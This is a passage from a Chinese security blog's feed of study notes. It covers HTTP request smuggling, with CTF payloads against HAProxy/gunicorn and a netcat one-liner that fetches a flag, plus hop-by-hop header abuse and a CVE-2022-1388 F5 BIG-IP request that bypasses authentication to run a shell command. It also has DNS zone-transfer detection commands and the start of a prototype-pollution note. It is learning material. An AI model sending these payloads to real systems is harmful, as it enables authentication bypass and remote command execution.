&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;POST /public/testing HTTP/1.1&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: sozu.chall.pwnoh.io&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">transfer-encoding: chunked&lt;/span>&lt;span style="color:#8045ff">\t\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">content-length: 60&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">hi&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">0&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /internal/flag HTTP/1.1&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: localhost&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /public/test HTTP/1.1&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: sozu.chall.pwnoh.io&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#8045ff">\r&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">interactive&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="不知名题">不知名题&lt;/h4>
&lt;p>&lt;a href="https://hg8.sh/posts/misc-ctf/request-smuggling/">https://hg8.sh/posts/misc-ctf/request-smuggling/&lt;/a>&lt;/p>
&lt;p>正常的响应包提示Server: gunicorn/19.9.0，当访问/results时 有一个HAProxy Authentication，所以web部分应该是这样的架构&lt;/p>
&lt;pre tabindex="0">&lt;code> User
|
|
+-----+-----+
| |
| HAProxy |
| |
+-----+-----+
|
|
+---------+----------+ +-------------+
| | | |
| Gunicorn | | Web App |
| WSGI HTTP Server +-----+ Python (?) |
| | | |
+--------------------+ +-------------+
&lt;/code>&lt;/pre>&lt;p>前端的服务器是HAProxy，后端的是gunicorn，所以我们尝试smuggling，夹带一个/results的请求，让它不被前端服务器HAProxy解析 直接转发给后端的gunicorn&lt;/p>
&lt;p>尝试这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">misc.ctf:33433&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>正常情况下前端的HAProxy会这样转发给后端的gunicorn&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">misc.ctf:33433&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">X-Forwarded-For&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">172.21.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以注意到末尾的X因为CL的原因而被丢掉 并且忽略了TE，我们smuggling是需要TE的，尝试这样修改&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">misc.ctf:33433&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">[\x0b]chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMUGGLED
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>转发后是这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">misc.ctf:33433&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Transfer-Encoding:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> chunked
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For: 172.21.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMUGGLED
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>成功走私了内容&lt;/p>
&lt;p>直接放最后的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">misc.ctf:33433&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">39&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">�chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>A
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /results HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Foo: xGET / HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#111">printf&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 39\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /results HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n\r\n&amp;#34;&lt;/span> &lt;span style="color:#111">|&lt;/span> nc misc.ctf:33433
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTTP/1.1 &lt;span style="color:#ae81ff">400&lt;/span> BAD REQUEST
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Server: gunicorn/19.9.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Thu, &lt;span style="color:#ae81ff">04&lt;/span> Jun &lt;span style="color:#ae81ff">2020&lt;/span> 17:41:32 GMT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/html&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#f92672">=&lt;/span>utf-8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: &lt;span style="color:#ae81ff">192&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style="color:#d88200">&amp;#34;-//W3C//DTD HTML 3.2 Final//EN&amp;#34;&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;h1&amp;gt;Bad Request&amp;lt;/h1&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;p&amp;gt;The browser &lt;span style="color:#f92672">(&lt;/span>or proxy&lt;span style="color:#f92672">)&lt;/span> sent a request that this server could not understand.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTTP/1.1 &lt;span style="color:#ae81ff">200&lt;/span> OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Server: gunicorn/19.9.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Thu, &lt;span style="color:#ae81ff">04&lt;/span> Jun &lt;span style="color:#ae81ff">2020&lt;/span> 17:41:32 GMT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/html&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#f92672">=&lt;/span>utf-8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: &lt;span style="color:#ae81ff">30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag&lt;span style="color:#f92672">{&lt;/span>r3KW35t 5mu99L1N9 &lt;span style="color:#ae81ff">12&lt;/span> 8Ad&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="修复">修复&lt;/h3>
&lt;ul>
&lt;li>使用HTTP/2&lt;/li>
&lt;/ul>
&lt;p>加入了Request multiplexing over a single TCP connection，减少TCP连接复用的可能性&lt;/p>
&lt;ul>
&lt;li>前后端服务器一致&lt;/li>
&lt;li>禁用代理服务器与后端服务器之间的TCP连接复用&lt;/li>
&lt;/ul>
&lt;h2 id="hop-by-hop-headers-abuse">hop-by-hop headers abuse&lt;/h2>
&lt;p>根据&lt;a href="https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1">RFC 2612&lt;/a>，为了区分请求中代理是否存cache的行为，把请求头区分为以下两种&lt;/p>
&lt;ul>
&lt;li>end-to-end&lt;/li>
&lt;/ul>
&lt;p>必须贯穿请求始终&lt;/p>
&lt;ul>
&lt;li>hop-by-hop&lt;/li>
&lt;/ul>
&lt;p>当请求中遇到这些请求头，一个正常的proxy不会把这些信息带到下一个hop内；默认hop-by-hop有这些&lt;/p>
&lt;pre tabindex="0">&lt;code>Connection
Keep-Alive
Proxy-Authenticate
Proxy-Authorization
TE
Trailers
Transfer-Encoding
Upgrade
&lt;/code>&lt;/pre>&lt;p>除此之外还可以自定义请求头加入hop-by-hop的行列中，只需把它放入&lt;code>Connection&lt;/code>字段中即可&lt;/p>
&lt;pre tabindex="0">&lt;code>Connection: close, X-Foo, X-Bar
&lt;/code>&lt;/pre>&lt;p>由此导致的hop-by-hop头滥用可能会导致一些逻辑错误&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/hbh-theory-diagram.PNG" alt="img">&lt;/p>
&lt;p>如上图所示，正常proxy处理会在原始请求的下一跳（转移到代理）中移除hop-by-hop列表中的头，利用这种特性，在&lt;code>Connection&lt;/code>中被添加的头会被移除，有这样几种利用思路：删除XFF头隐藏IP、缓存中毒DoS、SSRF、绕过WAF&lt;/p>
&lt;p>由删header导致的权限提升漏洞有CVE-2021-32813，&lt;a href="https://github.com/traefik/traefik/pull/8319/commits/cbaf86a93014a969b8accf39301932c17d0d73f9">修复方案&lt;/a>就是BIG-IP同款的set，还有&lt;a href="https://github.com/clastix/capsule-proxy/issues/188">栗子&lt;/a>和&lt;a href="https://github.com/rancher/rancher/security/advisories/GHSA-pvxj-25m6-7vqr">栗子2&lt;/a>&lt;/p>
&lt;h3 id="cve-2022-1388">CVE-2022-1388&lt;/h3>
&lt;p>将鉴权用的&lt;code>X-F5-Auth-Token&lt;/code>头放入&lt;code>Connection&lt;/code>中让其在被转发至后端服务器时被删掉，从而绕过鉴权&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">POST /mgmt/tm/util/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Authorization: Basic YWRtaW46
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">X-F5-Auth-Token: a
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: Keep-alive, X-F5-Auth-Token
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">{
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;#34;command&amp;#34;:&amp;#34;run&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;#34;utilCmdArgs&amp;#34;:&amp;#34;-c id&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多java代码层的分析详见天河师傅的&lt;a href="https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw">这篇&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>首先是当X-F5-Auth-Token为空时走入另一条验证流程，而这个流程依赖于我们给header提供的Authorization:字段。因为Authorization字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">HTTP请求切分出处paper&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://portswigger.net/web-security/request-smuggling">burp详解&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Attack-Surface">一篇文章带你读懂 HTTP Smuggling 攻击&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004">cve-2018-8004&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://hg8.sh/posts/misc-ctf/request-smuggling/">不知名题&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q">BIG-IP(CVE-2022-1388)从修复方案分析出exp&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw">CVE-2022-1388漏洞分析&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">Abusing HTTP hop-by-hop request headers&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>DNS域传送漏洞学习</title><link>https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/</link><pubDate>Fri, 06 May 2022 16:52:58 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/</guid><description>&lt;p>DNS服务器提供域名解析的基础性服务，可以细分为主服务器、备份服务器、缓存服务器，备份服务器会从主服务器中拷贝数据来更新自己的数据库，而这个同步的过程中就需要用到DNS域传送，一旦配置不当，就可能会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，泄露重要信息&lt;/p>
&lt;h2 id="漏洞成因">漏洞成因&lt;/h2>
&lt;p>在域传送中关键的配置项有这两个&lt;/p>
&lt;pre tabindex="0">&lt;code>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器
allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器
&lt;/code>&lt;/pre>&lt;p>有两种设置方式，options或是zone，默认优先级为zone 如果为空则遵循options，示例&lt;/p>
&lt;pre tabindex="0">&lt;code>options {
listen-on { 1.1.1.1; };
listen-on-v6 { any; };
directory &amp;#34;/bind&amp;#34;;
pid-file &amp;#34;/bind/run/pid&amp;#34;;
dump-file &amp;#34;/bind/data/named_dump.db&amp;#34;;
statistics-file &amp;#34;/bind/data/named.stats&amp;#34;;
allow-transfer { any; };
allow-query {any;};
};
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>zone &amp;#34;wooyun.org&amp;#34; {
type master;
file &amp;#34;/bind/etc/wooyun.org.conf&amp;#34;;
allow-transfer {any;};
};
&lt;/code>&lt;/pre>&lt;p>如果没有手动添加&lt;code>allow-transfer&lt;/code>来限制获取记录的来源，就会存在DNS域传送漏洞&lt;/p>
&lt;h2 id="检测方式">检测方式&lt;/h2>
&lt;h3 id="dig--linux">dig / linux&lt;/h3>
&lt;p>以vulhub为例，以常规的8.8.8.8作为DNS服务器进行解析，如果发送axfr的请求会failed&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220506160422503.png" alt="image-20220506160422503">&lt;/p>
&lt;p>如果使用存在漏洞的DNS服务器进行查询，则会返回域内所有的字域、A记录和CNAME等信息&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220506160602721.png" alt="image-20220506160602721">&lt;/p>
&lt;h3 id="nslookup--windowslinux">nslookup / windows&amp;amp;linux&lt;/h3>
&lt;p>正常情况：&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220506163501741.png" alt="image-20220506163501741">&lt;/p>
&lt;p>存在漏洞的情况（linux示例）：&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220506164756031.png" alt="image-20220506164756031">&lt;/p>
&lt;h3 id="nmap">Nmap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -script dns-zone-transfer -script-args dns-zone-transfer.domain&lt;span style="color:#f92672">=&lt;/span>vulhub.org -p &lt;span style="color:#ae81ff">53&lt;/span> -Pn 172.27.0.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="dnsrecon">dnsrecon&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dnsrecon -d example.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="dnsenum">dnsenum&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dnsenum example.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/">浅析DNS域传送漏洞&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://drops.xmd5.com/static/drops/papers-64.html">DNS域传送信息泄露&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/blob/master/dns/dns-zone-transfer/README.zh-cn.md">vulhub复现环境&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>js原型污染学习笔记</title><link>https://amiaaaz.github.io/2022/05/04/js-prototype-pollution-study-notes/</link><pubDate>Wed, 04 May 2022 17:10:23 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/04/js-prototype-pollution-study-notes/</guid><description>&lt;p>学的时候随手记录的，可能有很多错误，见谅（&lt;/p>
&lt;p>参考链接统一在文末&lt;/p>
&lt;hr>
&lt;h2 id="基本定义">基本定义&lt;/h2>
&lt;h3 id="prototype__proto__">&lt;code>prototype&lt;/code>&amp;amp;&lt;code>__proto__&lt;/code>&lt;/h3>
&lt;p>js中定义类需要通过定义构造函数的方式进行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Foo&lt;/code>函数的内容就是&lt;code>Foo&lt;/code>类的构造函数，而&lt;code>this.bar&lt;/code>是&lt;code>Foo&lt;/code>类的一个属性；除了定义了值的普通属性我们还可以将方法定义到构造函数内部&lt;/p>
